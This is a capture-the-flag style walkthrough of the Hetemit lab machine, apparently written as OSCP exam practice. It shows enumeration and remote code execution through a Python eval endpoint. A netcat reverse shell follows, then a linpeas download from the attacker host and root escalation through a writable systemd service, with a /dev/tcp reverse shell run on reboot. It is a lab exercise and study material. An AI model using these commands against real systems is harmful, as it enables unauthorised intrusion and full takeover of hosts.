> Noamro08 - 16.1.2024

---
### Target:  192.168.154.117

## Enumeration

Start with normal nmap scan (services and default scripts):
```bash
nmap -Pn -n -sCV 192.168.154.117 -oN inital.scan
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-16 17:15 IST
Nmap scan report for 192.168.154.117
Host is up (0.081s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp    open  ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    open  http        Apache httpd 2.4.37 ((centos))
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CentOS \xE6\x8F\x90\xE4\xBE\x9B\xE7\x9A\x84 Apache HTTP \xE6\x9C\x8D\xE5\x8A\xA1\xE5\x99\xA8\xE6\xB5\x8B\xE8\xAF\x95\xE9\xA1\xB5
| http-methods: 
|_  Potentially risky methods: TRACE
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
50000/tcp open  http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Unix

Host script results:
|_clock-skew: -3s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-01-16T15:16:07
|_  start_date: N/A
```

We can see that port 50000 is open and running python 3.6, browsing there we can see two directories:
"{'/generate', '/verify'}"

in "http://192.168.154.117:50000/verify" we can see "{'code'}"
so we try to use this as parameter in POST request with curl:
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/Hetemit]
└─$ curl -X POST http://192.168.154.117:50000/verify --data "code=2*2"
4
```
we can see it evaluated what we wanted so now we try to ger RCE with the module in python "os.system"
first we need to confirm this module is on the box:
![[Pasted image 20240116180912.png]]
It is!! 
Now we can use "os.system()":
```bash
(kali㉿kali)-[~/…/oscp/PG/practice/Hetemit]
└─$ curl -X POST http://192.168.154.117:50000/verify --data "code=os.system('nc -e /bin/bash 192.168.45.214 80')"
```
![[Pasted image 20240116181443.png]]

we got rev shell, Upgrade our shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

now we get the local.txt
```bash
[cmeeks@hetemit ~]$ cat local.txt 
8f809ddd408a746e841dd1a3e7533375
```

checking for sudo priveleges: 
```bash
[cmeeks@hetemit ~]$ sudo -l
User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
```


now we get linpeas on the target with python server and run it:
```bash
kali -> python3 -m http.server 80

Target -> wget http://192.168.45.214:80/linpeas.sh
chmod u+x linpeas.sh
./linpeas.sh
```

we can see that:
"You have write privileges over /etc/systemd/system/pythonapp.service"
![[Pasted image 20240116184809.png]]
we can see that this service "pythonapp.service" is running:

we change this configuration file 
```bash
[cmeeks@hetemit restjson_hetemit]$ cat /etc/systemd/system/pythonapp.service
Description=Python App       
After=network-online.target                                                             
[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=flask run -h 0.0.0.0 -p 50000
TimeoutSec=30
RestartSec=15s
User=cmeeks
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

# after our changes:
Description=Python App
After=network-online.target[Service]
Type=simple
ExecStart=/home/cmeeks/restjson_hetemit/exploit.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure
```

we add the the file "/home/cmeeks/restjson_hetemit/exploit.sh" to run when the service is starting and the user to be root.
now we just need to add this file to this location and to reboot the machine:

```bash
cat exploit.sh
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/192.168.45.214/80 <&1'
```
simple revers shell that will run by root so we will elevate our privelges

now we open listener on port 80 on our host, and because we can reboot the machine with the sudo command without providing password this will atartup the service that we change to run the file with the reverse shell as root:

```bash
# Target:
[cmeeks@hetemit restjson_hetemit]$ sudo /sbin/reboot

# kali:
(kali㉿kali)-[~/…/oscp/PG/practice/Hetemit]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.214] from (UNKNOWN) [192.168.154.117] 45356
bash: cannot set terminal process group (1219): Inappropriate ioctl for device
bash: no job control in this shell
[root@hetemit /]# id
id
uid=0(root) gid=0(root) groups=0(root)
```

[root@hetemit ~]# cat proof.txt 
cat proof.txt
47c0ecb969b29e3921034f31296bccf8

